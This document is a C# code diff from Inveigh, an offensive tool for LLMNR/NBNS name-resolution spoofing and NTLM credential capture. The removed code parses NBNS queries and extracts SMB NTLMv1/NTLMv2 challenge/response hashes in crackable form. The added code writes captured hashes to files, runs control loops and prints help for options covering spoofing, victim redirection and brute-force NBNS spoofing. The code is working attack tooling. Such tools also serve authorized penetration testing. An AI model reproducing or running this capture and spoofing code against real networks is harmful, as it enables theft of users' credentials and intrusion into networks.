-            nbnsUTF8 = nbnsUTF8.Replace("-00", String.Empty);
-            string[] nbnsArray = nbnsUTF8.Split('-');
-            string nbnsQuery = "";
-
-            foreach (string character in nbnsArray)
-            {
-                nbnsQuery += new System.String(Convert.ToChar(Convert.ToInt16(character, 16)), 1);
-            }
-
-            if (nbnsQuery.Contains("CA"))
-            {
-                nbnsQuery = nbnsQuery.Substring(0, nbnsQuery.IndexOf("CA"));
-            }
-
-            int i = 0;
-            string nbnsQuerySubtracted = "";
-            do
-            {
-                byte nbnsQuerySub = (byte)Convert.ToChar(nbnsQuery.Substring(i, 1));
-                nbnsQuerySub -= 65;
-                nbnsQuerySubtracted += Convert.ToString(nbnsQuerySub, 16);
-                i++;
-            }
-            while (i < nbnsQuery.Length);
-
-            i = 0;
-            string nbnsQueryHost = "";
-
-            do
-            {
-                nbnsQueryHost += (Convert.ToChar(Convert.ToInt16(nbnsQuerySubtracted.Substring(i, 2), 16)));
-                i += 2;
-            }
-            while (i < nbnsQuerySubtracted.Length - 1);
-
-            return nbnsQueryHost;
-        }
-
-        public static string NBNSQueryType(byte[] field)
-        {
-            string nbnsQuery1 = BitConverter.ToString(field);
-            string nbnsQueryType = "";
-
-            switch (nbnsQuery1)
-            {
-                case "41-41":
-                    nbnsQueryType = "00";
-                    break;
-
-                case "41-44":
-                    nbnsQueryType = "03";
-                    break;
-
-                case "43-41":
-                    nbnsQueryType = "20";
-                    break;
-
-                case "42-4C":
-                    nbnsQueryType = "1B";
-                    break;
-
-                case "42-4D":
-                    nbnsQueryType = "1C";
-                    break;
-
-                case "42-4E":
-                    nbnsQueryType = "1D";
-                    break;
-
-                case "42-4F":
-                    nbnsQueryType = "1E";
-                    break;
-
-            }
-
-            return nbnsQueryType;
-        }
-
-        public static string GetSMBNTLMChallenge(byte[] field)
-        {
-            string payload = System.BitConverter.ToString(field);
-            payload = payload.Replace("-", String.Empty);
-            int index = payload.IndexOf("4E544C4D53535000");
-            string challenge = "";
-
-            if (index > 0 && payload.Substring((index + 16), 8) == "02000000")
-            {
-                challenge = payload.Substring((index + 48), 16);
-                uint targetNameLength = UInt16DataLength(((index + 24) / 2), field);
-                int negotiateFlags = System.Convert.ToInt16((payload.Substring((index + 44), 2)), 16);
-                string negotiateFlagsValues = Convert.ToString(negotiateFlags, 2);
-                string targetInfoFlag = negotiateFlagsValues.Substring(0, 1);
-                string netBIOSDomainName = "";
-                string dnsComputerName = "";
-                string dnsDomainName = "";
-
-                if (targetInfoFlag == "1")
+                if (ntlmv1FileList.Count > 0)
                 {
-                    int targetInfoIndex = ((index + 80) / 2) + (int)targetNameLength + 16;
-                    byte targetInfoItemType = field[targetInfoIndex];
-                    int i = 0;
 
-                    while (targetInfoItemType != 0 && i < 10)
+                    using (StreamWriter outputFileNTLMv1 = new StreamWriter(Path.Combine(currentDirectory, "Inveigh-NTLMv1.txt"), true))
                     {
-                        uint targetInfoItemLength = UInt16DataLength((targetInfoIndex + 2), field);
+                        outputFileNTLMv1.WriteLine(ntlmv1FileList[0]);
+                        outputFileNTLMv1.Close();
+                        ntlmv1FileList.RemoveAt(0);
+                    }
 
-                        switch (targetInfoItemType)
+
+                }
+
+                if (ntlmv2FileList.Count > 0)
+                {
+
+                    using (StreamWriter outputFileNTLMv2 = new StreamWriter(Path.Combine(currentDirectory, "Inveigh-NTLMv2.txt"), true))
+                    {
+                        outputFileNTLMv2.WriteLine(ntlmv2FileList[0]);
+                        outputFileNTLMv2.Close();
+                        ntlmv2FileList.RemoveAt(0);
+                    }
+
+                }
+
+                System.Threading.Thread.Sleep(100);
+            }
+
+        }
+
+        static void OutputLoop()
+        {
+
+            do
+            {
+                while (consoleOutput && !Console.KeyAvailable)
+                {
+
+                    if (consoleList.Count > 0)
+                    {
+
+                        if (consoleList[0].StartsWith("[*]"))
                         {
-                            case 2:
-                                netBIOSDomainName = DataToString((targetInfoIndex + 4), (int)targetInfoItemLength, field);
-                                break;
-
-                            case 3:
-                                dnsComputerName = DataToString((targetInfoIndex + 4), (int)targetInfoItemLength, field);
-                                break;
-
-                            case 4:
-                                dnsDomainName = DataToString((targetInfoIndex + 4), (int)targetInfoItemLength, field);
-                                break;
+                            Console.ForegroundColor = ConsoleColor.Green;
+                            Console.WriteLine(consoleList[0]);
+                            Console.ResetColor();
+                        }
+                        else if (consoleList[0].StartsWith("[!]"))
+                        {
+                            Console.ForegroundColor = ConsoleColor.Yellow;
+                            Console.WriteLine(consoleList[0]);
+                            Console.ResetColor();
+                        }
+                        else
+                        {
+                            Console.WriteLine(consoleList[0]);
                         }
 
-                        targetInfoIndex += (int)targetInfoItemLength + 4;
-                        targetInfoItemType = field[targetInfoIndex];
-                        i++;
+                        consoleList.RemoveAt(0);
+                    }
+
+                }
+            } while (Console.ReadKey(true).Key != ConsoleKey.Escape);
+
+        }
+
+        static void ControlLoop(int runCount, int runTime)
+        {
+            var stopwatchRunTime = new Stopwatch();
+            stopwatchRunTime.Start();
+
+            while (true)
+            {
+
+                if (runTime > 0 && consoleOutput && stopwatchRunTime.Elapsed.Minutes >= runTime)
+                {
+                    outputList.Add(String.Format("[*] {0} Inveigh is exiting due to reaching run time", DateTime.Now.ToString("s")));
+                    exitInveigh = true;
+                }
+
+                if (runCount > 0 && consoleOutput && (ntlmv1List.Count >= runCount || ntlmv2List.Count >= runCount))
+                {
+                    outputList.Add(String.Format("[*] {0} Inveigh is exiting due to reaching run count", DateTime.Now.ToString("s")));
+                    exitInveigh = true;
+                }
+
+                while (outputList.Count > 0)
+                {
+                    consoleList.Add(outputList[0]);
+                    logList.Add(outputList[0]);
+                    logFileList.Add(outputList[0]);
+
+                    lock (outputList)
+                    {
+                        outputList.RemoveAt(0);
                     }
 
                 }
 
-            }
-
-            return challenge;
-        }
-
-        public static string GetSMBNTLMResponse(byte[] field, string sourceIP, string sourcePort)
-        {
-            string payload = System.BitConverter.ToString(field);
-            payload = payload.Replace("-", String.Empty);
-            string session = sourceIP + ":" + sourcePort;
-            int index = payload.IndexOf("4E544C4D53535000");
-            string lmResponse = "";
-            string ntlmResponse = "";
-            int ntlmLength = 0;
-            string challenge = "";
-            string domain = "";
-            string user = "";
-            string host = "";
-
-            if (index > 0 && payload.Substring((index + 16), 8) == "03000000")
-            {
-                int ntlmsspOffset = index / 2;
-                int lmLength = (int)UInt16DataLength((ntlmsspOffset + 12), field);
-                int lmOffset = (int)UInt32DataLength((ntlmsspOffset + 16), field);
-                byte[] lmPayload = new byte[lmLength];
-                System.Buffer.BlockCopy(field, (ntlmsspOffset + lmOffset), lmPayload, 0, lmPayload.Length);
-                lmResponse = System.BitConverter.ToString(lmPayload).Replace("-", String.Empty);
-                ntlmLength = (int)UInt16DataLength((ntlmsspOffset + 20), field);
-                int ntlmOffset = (int)UInt32DataLength((ntlmsspOffset + 24), field);
-                byte[] ntlmPayload = new byte[ntlmLength];
-                System.Buffer.BlockCopy(field, (ntlmsspOffset + ntlmOffset), ntlmPayload, 0, ntlmPayload.Length);
-                ntlmResponse = System.BitConverter.ToString(ntlmPayload).Replace("-", String.Empty);
-                int domainLength = (int)UInt16DataLength((ntlmsspOffset + 28), field);
-                int domainOffset = (int)UInt32DataLength((ntlmsspOffset + 32), field);
-                byte[] domainPayload = new byte[domainLength];
-                System.Buffer.BlockCopy(field, (ntlmsspOffset + domainOffset), domainPayload, 0, domainPayload.Length);
-                domain = DataToString((ntlmsspOffset + domainOffset), domainLength, field);
-                int userLength = (int)UInt16DataLength((ntlmsspOffset + 36), field);
-                int userOffset = (int)UInt32DataLength((ntlmsspOffset + 40), field);
-                byte[] userPayload = new byte[userLength];
-                System.Buffer.BlockCopy(field, (ntlmsspOffset + userOffset), userPayload, 0, userPayload.Length);
-                user = DataToString((ntlmsspOffset + userOffset), userLength, field);
-                int hostLength = (int)UInt16DataLength((ntlmsspOffset + 44), field);
-                int hostOffset = (int)UInt32DataLength((ntlmsspOffset + 48), field);
-                byte[] hostPayload = new byte[hostLength];
-                System.Buffer.BlockCopy(field, (ntlmsspOffset + hostOffset), hostPayload, 0, hostPayload.Length);
-                host = DataToString((ntlmsspOffset + hostOffset), hostLength, field);
-                challenge = smbSessionTable[session].ToString();
-
-                if (ntlmLength > 24)
+                if (exitInveigh && consoleOutput)
                 {
-                    string ntlmV2Hash = user + "::" + domain + ":" + challenge + ":" + ntlmResponse.Insert(32, ":");
-                    outputQueue.Enqueue(String.Format("[+] {0} SMB NTLMv2 challenge/response captured from {1}({2}):{3}{4}", DateTime.Now.ToString("s"), sourceIP, host, System.Environment.NewLine, ntlmV2Hash));
-                    ntlmv2Queue.Enqueue(ntlmV2Hash);
-                }
-                else if (ntlmLength == 24)
-                {
-                    string ntlmV1Hash = user + "::" + domain + ":" + lmResponse + ":" + ntlmResponse + ":" + challenge;
-                    outputQueue.Enqueue(String.Format("[+] {0} SMB NTLMv1 challenge/response captured from {1}({2}):{3}{4}", DateTime.Now.ToString("s"), sourceIP, host, System.Environment.NewLine, ntlmV1Hash));
-                    ntlmv1Queue.Enqueue(ntlmV1Hash);
+                    while (consoleList.Count > 0)
+                    {
+                        System.Threading.Thread.Sleep(5);
+                    }
+
+                    Environment.Exit(0);
                 }
 
+                System.Threading.Thread.Sleep(5);
             }
 
-            return ntlmResponse;
         }
 
-        public static void SMBConnection(byte[] field, string IP, string sourceIP, string sourcePort, string port)
+        static void GetHelp(string parameter)
         {
-            string payload = System.BitConverter.ToString(field);
-            payload = payload.Replace("-", String.Empty);
-            string session = sourceIP + ":" + sourcePort;
-            int index = payload.IndexOf("FF534D42");
+            bool nullParameter = true;
 
-            if(!smbSessionTable.ContainsKey(session) && index > 0 && payload.Substring((index + 8),2) == "72" && IP != sourceIP)
+            Console.WriteLine("");
+
+            if (String.IsNullOrEmpty(parameter))
             {
-                outputQueue.Enqueue(String.Format("[+] {0} SMB({1}) negotiation request detected from {2}", DateTime.Now.ToString("s"), port, session));
+                Console.WriteLine("Parameters:\n");
+            }
+            else
+            {
+                Console.WriteLine("Parameter:\n");
+                nullParameter = false;
             }
 
-            if(!smbSessionTable.ContainsKey(session) && index > 0)
+            if (nullParameter || String.Equals(parameter, "CHALLENGE"))
             {
-                smbSessionTable.Add(session, "");
+                Console.WriteLine(" -Challenge               Default = Random: 16 character hex NTLM challenge for use with the HTTP listener.");
+                Console.WriteLine("                          If left blank, a random challenge will be generated for each request.");
             }
 
-            index = payload.IndexOf("FE534D42");
-
-            if (!smbSessionTable.ContainsKey(session) && index > 0 && payload.Substring((index + 24), 4) == "0000" && IP != sourceIP)
+            if (nullParameter || String.Equals(parameter, "ELEVATEDPRIVILEGE"))
             {
-                outputQueue.Enqueue(String.Format("[+] {0} SMB({1}) negotiation request detected from {2}", DateTime.Now.ToString("s"), port, session));
+                Console.WriteLine(" -ElevatedPrivilege       Default = Auto: (Auto/Y/N) Set the privilege mode. Auto will determine if Inveigh");
+                Console.WriteLine("                          is running with elevated privilege.If so, options that require elevated privilege");
+                Console.WriteLine("                          can be used.");
             }
 
-            if (!smbSessionTable.ContainsKey(session) && index > 0)
+            if (nullParameter || String.Equals(parameter, "FILEOUTPUT"))
             {
-                smbSessionTable.Add(session, "");
+                Console.WriteLine(" -FileOutput              Default = Disabled: (Y/N) Enable/Disable real time file output.");
             }
 
+            if (nullParameter || String.Equals(parameter, "FILEOUTPUTDIRECTORY"))
+            {
+                Console.WriteLine(" -FileOutputDirectory     Default = Working Directory: Valid path to an output directory for log and capture");
+                Console.WriteLine("                          files. FileOutput must also be enabled.");
+            }
+
+            if (nullParameter || String.Equals(parameter, "FILEUNIQUE"))
+            {
+                Console.WriteLine(" -FileUnique              Default = Enabled: (Y/N) Enable/Disable outputting challenge/response hashes for");
+                Console.WriteLine("                          only unique IP, domain/hostname, and username combinations when real time file");
+                Console.WriteLine("                          output is enabled.");
+            }
+
+            if (nullParameter || String.Equals(parameter, "HTTP"))
+            {
+                Console.WriteLine(" -HTTP                    Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.");
+            }
+
+            if (nullParameter || String.Equals(parameter, "IP"))
+            {
+                Console.WriteLine(" -IP                      Local IP address for listening and packet sniffing. This IP address will also be");
+                Console.WriteLine("                          used for LLMNR/NBNS spoofing if the SpooferIP parameter is not set.");
+            }
+
+            if (nullParameter || String.Equals(parameter, "LLMNR"))
+            {
+                Console.WriteLine(" -LLMNR                   Default = Enabled: (Y/N) Enable/Disable LLMNR spoofing.");
+            }
+
+            if (nullParameter || String.Equals(parameter, "NBNS"))
+            {
+                Console.WriteLine(" -NBNS                    Default = Disabled: (Y/N) Enable/Disable NBNS spoofing.");
+            }
+
+            if (nullParameter || String.Equals(parameter, "NBNSTYPES"))
+            {
+                Console.WriteLine(" -NBNSTypes               Default = Disabled: (Y/N) Enable/Disable NBNS brute force spoofer.");
+            }
+
+            if (nullParameter || String.Equals(parameter, "RUNCOUNT"))
+            {
+                Console.WriteLine(" -RunCount                Default = Unlimited: (Integer) Number of NTLMv1/NTLMv2 captures to perform before");
+                Console.WriteLine("                          auto-exiting.");
+            }
+
+            if (nullParameter || String.Equals(parameter, "RUNTIME"))
+            {
+                Console.WriteLine(" -RunTime                 (Integer) Run time duration in minutes.");
+            }
+
+            if (nullParameter || String.Equals(parameter, "SMB"))
+            {
+                Console.WriteLine(" -SMB                     Default = Enabled: (Y/N) Enable/Disable SMB challenge/response capture. Warning,");
+                Console.WriteLine("                          LLMNR/NBNS spoofing can still direct targets to the host system's SMB server.");
+                Console.WriteLine("                          Block TCP ports 445/139 or kill the SMB services if you need to prevent login");
+                Console.WriteLine("                          equests from being processed by the Inveigh host.");
+            }
+
+            if (nullParameter || String.Equals(parameter, "SPOOFERHOSTSIGNORE"))
+            {
+                Console.WriteLine(" -SpooferHostsIgnore      Default = All: Comma separated list of requested hostnames to ignore when spoofing");
+                Console.WriteLine("                          with LLMNR/NBNS.");
+            }
+
+            if (nullParameter || String.Equals(parameter, "SPOOFERHOSTSREPLY"))
+            {
+                Console.WriteLine(" -SpooferHostsReply       Default = All: Comma separated list of requested hostnames to respond to when spoofing");
+                Console.WriteLine("                          with LLMNR/NBNS.");
+            }
+
+            if (nullParameter || String.Equals(parameter, "SPOOFERIP"))
+            {
+                Console.WriteLine(" -SpooferIP               IP address for LLMNR/NBNS spoofing. This parameter is only necessary when");
+                Console.WriteLine("                          redirecting victims to a system other than the Inveigh host.");
+            }
+
+            if (nullParameter || String.Equals(parameter, "SPOOFERIPSIGNORE"))
+            {
+                Console.WriteLine(" -SpooferIPsIgnore        Default = All: Comma separated list of source IP addresses to ignore when spoofing with");
+                Console.WriteLine("                          LLMNR/NBNS.");
+            }
+
+            if (nullParameter || String.Equals(parameter, "SPOOFERIPSREPLY"))
+            {
+                Console.WriteLine(" -SpooferIPsReply         Default = All: Comma separated list of source IP addresses to respond to when spoofing");
+                Console.WriteLine("                          with LLMNR/NBNS.");
+            }
+
+            if (nullParameter || String.Equals(parameter, "SPOOFERREPEAT"))
+            {
+                Console.WriteLine(" -SpooferRepeat           Default = Enabled: (Y/N) Enable/Disable repeated LLMNR/ NBNS spoofs to a victim system");
+                Console.WriteLine("                          after one user challenge/response has been captured.");
+            }
+
+            if (nullParameter || String.Equals(parameter, "WPADAUTH"))
+            {
+                Console.WriteLine(" -WPADAuth                Default = NTLM: (Anonymous/Basic/NTLM/NTLMNoESS) HTTP/HTTPS listener authentication type");
+                Console.WriteLine("                          for wpad.dat requests. Setting to Anonymous can prevent browser login prompts. NTLMNoESS ");
+                Console.WriteLine("                          turns off the 'Extended Session Security' flag during negotiation.");
+            }
+
+            Console.WriteLine();
         }
 
     }
